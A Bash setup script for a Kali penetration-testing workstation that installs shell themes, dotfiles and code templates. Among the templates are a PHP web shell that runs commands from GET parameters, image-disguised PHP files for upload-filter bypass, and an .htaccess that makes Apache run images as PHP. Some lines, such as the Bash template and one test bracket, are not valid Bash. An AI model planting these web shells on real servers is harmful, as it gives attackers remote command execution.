#!/bin/bash

# Uninstallations
cd ~
sudo apt remove vim --purge -y
sudo apt remove nano --purge -y
sudo snap remove autopsy

# Configuration files
cd ~
mkdir -p tools && cd tools
[ -d "config_files" ] && rm -rf config_files
git clone https://gitlab.com/VIsh0k/config_files.git

# Desktop/wallpapers directory
cd ~/Desktop

# Wallpaper configuration
mkdir -p wallpapers && cd wallpapers
cp ~/tools/config_files/wallpapers/* . 2>/dev/null

# Login wallpaper configuration
sudo cp s4vitar.jpg /usr/share/backgrounds/kali/kali-maze-16x9.jpg 2>/dev/null
sudo cp s4vitar.jpg /usr/share/backgrounds/kali/login.svg 2>/dev/null

# Documents directory structure
cd ~/Documents
mkdir -p {htb_academy,htb_apps,htb_challenges,testing,cpts,ejpt,oscp}

cd ~/
cp -r tools/config_files/bin .

# ZSH configuration
cd ~
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended

# ZSH plugins
cd ~/.oh-my-zsh/custom/plugins
git clone https://github.com/zsh-users/zsh-autosuggestions.git
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git

# Powerlevel10k theme
cd ~/.oh-my-zsh
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
mv ~/powerlevel10k ~/.oh-my-zsh

# Root user styling (zshrc and micro)
sudo mkdir -p /root/.config/micro/colorschemes
sudo cp ~/tools/config_files/zshrc /root/.zshrc
sudo cp ~/tools/config_files/microTheme.micro /root/.config/micro/colorschemes/microTheme.micro

# Appearance configuration
cd ~/tools/config_files

# Copy zshrc
cp zshrc ~/.zshrc

# Extract and configure themes
[ -d "mantis" ] && rm -rf mantis
tar -xf mantiNight.tar
tar -xf darksun.tar

mkdir -p ~/.themes
cp -r mantiNight ~/.themes/mantiNight
cp -r darksun ~/.themes/darksun

rm -f mantiNight.tar darksun.tar
rm -rf mantiNight darksun

# Cursor configuration
tar -xf darkCursorTheme.tar.gz
mkdir -p ~/.icons
cp -r darkCursorTheme ~/.icons/
rm -rf darkCursorTheme darkCursorTheme.tar.gz

# Micro editor configuration
mkdir -p ~/.config/micro/colorschemes
cp microTheme.micro ~/.config/micro/colorschemes/

# Kitty terminal configuration
mkdir -p ~/.config/kitty
cp kitty.conf ~/.config/kitty/kitty.conf

# Rofi configuration
sudo cp -f rofiTheme.rasi /usr/share/rofi/themes/rofiTheme.rasi

# XFCE configuration files
mkdir -p ~/.config/xfce4/xfconf/xfce-perchannel-xml/
cp xfce4-keyboard-shortcuts.xml ~/.config/xfce4/xfconf/xfce-perchannel-xml/
cp xfce4-power-manager.xml ~/.config/xfce4/xfconf/xfce-perchannel-xml/
cp xfce4Settings.xml ~/.config/xfce4/xfconf/xfce-perchannel-xml/

# Tilix terminal profile
# dconf load /com/gexperts/Tilix/ < ~/tools/config_files/tilixProfile.conf

# GTK configuration
mkdir -p ~/.config/gtk-3.0
echo "[Settings]
gtk-theme-name=mantiNight
gtk-application-prefer-dark-theme=1
gtk-cursor-theme-name=darkCursorTheme" > ~/.config/gtk-3.0/settings.ini

# Root user themes configuration
sudo mkdir -p /root/.themes
sudo mkdir -p /root/.icons
sudo mkdir -p /root/.config/gtk-3.0
sudo cp -r ~/.themes/* /root/.themes/ 2>/dev/null
sudo cp -r ~/.icons/* /root/.icons/ 2>/dev/null
sudo cp ~/.config/gtk-3.0/settings.ini /root/.config/gtk-3.0/

# C# Template - create directory and files
mkdir -p ~/Templates/Cs_testing

# C# .csproj file
cat > ~/Templates/Cs_testing/Cs_testing.csproj << 'EOF'
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
EOF

# C# .sln file
cat > ~/Templates/Cs_testing/Cs_testing.sln << 'EOF'
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.2.0
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Cs_testing", "Cs_testing.csproj", "{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {8E3EBE5F-5726-4511-AB60-D1BF277D58B4}
	EndGlobalSection
EndGlobal
EOF

# C# Program.cs file
cat > ~/Templates/Cs_testing/Program.cs << 'EOF'
using System;
using Microsoft.Extensions.Configuration;

class Program {
    static void Main(string[] args) {
        Console.WriteLine("/*== Project to test ==*/");

        Program program = new Program();
        program.Test();
    }

    private void Test() {
        
    }
}
EOF

# Basic HTML template
cat > ~/Templates/HTML_template.html << 'EOF'
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>HTML Template</h1>
</body>
</html>
EOF

# PHP RCE template
cat > ~/Templates/Php_rce_script.php << 'EOF'
<?php
	class PHP_rce {
	    public static function main() {
	        if(isset($_GET['cmd'])) {
	            system($_GET['cmd']);
	        }
	        
	        if(isset($_GET['exec'])) {
	            echo shell_exec($_GET['exec']);
	        }
	        
	        if(isset($_GET['pass'])) {
	            passthru($_GET['pass']);
	        }
	        
	        if(isset($_GET['back'])) {
	            echo `{$_GET['back']}`;
	        }
	    }
	}

	PHP_rce::main();
?>
EOF

# PHP template
cat > ~/Templates/PHP_test.php << 'EOF'
<?php
class PHP_test {
    public static function main() {
        echo "/*== PHP Project to test ==*/";
        
        $app = new PHP_test();
        $app->test();
    }
    
    private function test() {
        
    }
}

PHP_test::main();
?>
EOF

# JavaScript template
cat > ~/Templates/JavaScript_test.js << 'EOF'
class JavaScript_test {
    static main() {
        console.log("/*== JavaScript Project to test ==*/");
        
        const app = new JavaScript_test();
        app.test();
    }
    
    test() {
        
    }
}

JavaScript_test.main();
EOF

# PowerShell template
cat > ~/Templates/PowerShell_test.ps1 << 'EOF'
class PowerShell_test {
    static [void] Main() {
        Write-Host "/*== PowerShell Project to test ==*/"
        
        $app = [PowerShell_test]::new()
        $app.Test()
    }
    
    [void] Test() {
        
    }
}

PowerShell_test::Main()
EOF

# Go template
cat > ~/Templates/Go_test.go << 'EOF'
package main

import "fmt"

type Go_test struct {}

func main() {
    fmt.Println("/*== Go Project to test ==*/")
    
    app := Go_test{}
    app.Test()
}

func (g Go_test) Test() {
    
}
EOF

# Rust template
cat > ~/Templates/Rust_test.rs << 'EOF'
struct Rust_test;

impl Rust_test {
    fn main() {
        println!("/*== Rust Project to test ==*/");
        
        let app = Rust_test;
        app.test();
    }
    
    fn test(&self) {
        
    }
}

fn main() {
    Rust_test::main();
}
EOF

# Java template
cat > ~/Templates/Java_test.java << 'EOF'
public class Java_test {
    public static void main(String[] args) {
        System.out.println("/*== Java Project to test ==*/");
        
        Java_test app = new Java_test();
        app.test();
    }
    
    private void test() {
        
    }
}
EOF

# Bash template
cat > ~/Templates/Bash_test.sh << 'EOF'
#!/bin/bash

class Bash_test {
    main() {
        echo "/*== Bash Project to test ==*/"
        
        Bash_test app
        app.test
    }
    
    test() {
        
    }
}

Bash_test.main "$@"
EOF

# Python template
cat > ~/Templates/Py_testing.py << 'EOF'
class Py_testing:
    def main():
        print('/*== Project to test ==*/')

        program = Py_testing()
        program.test()

    def test(self):
        pass

if __name__ == '__main__':
    Py_testing.main()
EOF

# C++ template
cat > ~/Templates/CPP_test.cpp << 'EOF'
#include <iostream>

class CPP_test {
public:
    static void main() {
        std::cout << "/*== C++ Project to test ==*/" << std::endl;
        
        CPP_test app;
        app.test();
    }
    
    void test() {
        
    }
};

int main() {
    CPP_test::main();
    return 0;
}
EOF

# Ruby template
cat > ~/Templates/Ruby_test.rb << 'EOF'
class Ruby_test
    def self.main
        puts "/*== Ruby Project to test ==*/"
        
        app = Ruby_test.new
        app.test
    end
    
    def test
        
    end
end

Ruby_test.main
EOF

# TypeScript template
cat > ~/Templates/TypeScript_test.ts << 'EOF'
class TypeScript_test {
    static main(): void {
        console.log("/*== TypeScript Project to test ==*/");
        
        const app = new TypeScript_test();
        app.test();
    }
    
    test(): void {
        
    }
}

TypeScript_test.main();
EOF

# Image Templates - Create empty image files for various formats

# PNG template
echo "Creating PNG template..."
touch ~/Templates/empty_image.png

# JPEG template  
echo "Creating JPEG template..."
touch ~/Templates/empty_image.jpg

# GIF template
echo "Creating GIF template..."
touch ~/Templates/empty_image.gif

# BMP template
echo "Creating BMP template..."
touch ~/Templates/empty_image.bmp

# WebP template
echo "Creating WebP template..."
touch ~/Templates/empty_image.webp

# TIFF template
echo "Creating TIFF template..."
touch ~/Templates/empty_image.tiff

# ICO template
echo "Creating ICO template..."
touch ~/Templates/empty_image.ico

# SVG template (vector)
echo "Creating SVG template..."
cat > ~/Templates/empty_image.svg << 'EOF'
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="white"/>
  <text x="50%" y="50%" font-family="Arial" font-size="12" text-anchor="middle" dy=".3em">Empty SVG</text>
</svg>
EOF

# Double extension templates for penetration testing

# PHP in PNG (for file upload bypass testing)
echo "Creating PHP-PNG double extension template..."
cat > ~/Templates/test.php.png << 'EOF'
GIF89a
<?php
// This file has double extension .php.png
// Useful for file upload bypass testing
echo "PHP code executed";
system($_GET['cmd']);
?>
EOF

# PHP in JPEG (for file upload bypass testing)
echo "Creating PHP-JPEG double extension template..."
cat > ~/Templates/test.php.jpg << 'EOF'
ÿØÿà
<?php
// This file has double extension .php.jpg  
// Useful for file upload bypass testing
echo "PHP code executed";
system($_GET['cmd']);
?>
EOF

# PHP in GIF (for file upload bypass testing)
echo "Creating PHP-GIF double extension template..."
cat > ~/Templates/test.php.gif << 'EOF'
GIF89a
<?php
// This file has double extension .php.gif
// Useful for file upload bypass testing
echo "PHP code executed"; 
system($_GET['cmd']);
?>
EOF

# HTACCESS with image handler (for .htaccess attacks)
echo "Creating .htaccess image handler template..."
cat > ~/Templates/htaccess_image_handler.htaccess << 'EOF'
AddType application/x-httpd-php .png .jpg .gif .jpeg
<FilesMatch "\.(png|jpg|gif|jpeg)$">
SetHandler application/x-httpd-php
</FilesMatch>
EOF

# Make bash template executable
chmod +x ~/Templates/Bash_test.sh

# Install JetBrains Mono fonts
cd ~/Desktop
mkdir -p jetbrains && cd jetbrains
[ ! -f "JetBrainsMono*.zip" ] && echo "The JetBrains font has not been downloaded"
mv ~/Downloads/JetBrainsMono*.zip . 2>/dev/null
if ls JetBrainsMono*.zip 1> /dev/null 2>&1; then
    unzip -o JetBrainsMono*.zip
    sudo mkdir -p /usr/share/fonts/truetype/jetbrains-mono
    sudo mv fonts/ttf/* /usr/share/fonts/truetype/jetbrains-mono/ 2>/dev/null
fi

[ -d "jetbrains" ]] && rm -rf jetbrains

# Set execution permissions
# chmod +x ~/.config/bspwm/bspwmrc
# chmod +x ~/.config/sxhkd/sxhkdrc

echo "Setup completed successfully"
echo "Templates created in ~/Templates/"
echo "Image templates include: .png, .jpg, .gif, .bmp, .webp, .tiff, .ico, .svg"
echo "Double extension templates for pentesting: .php.png, .php.jpg, .php.gif"
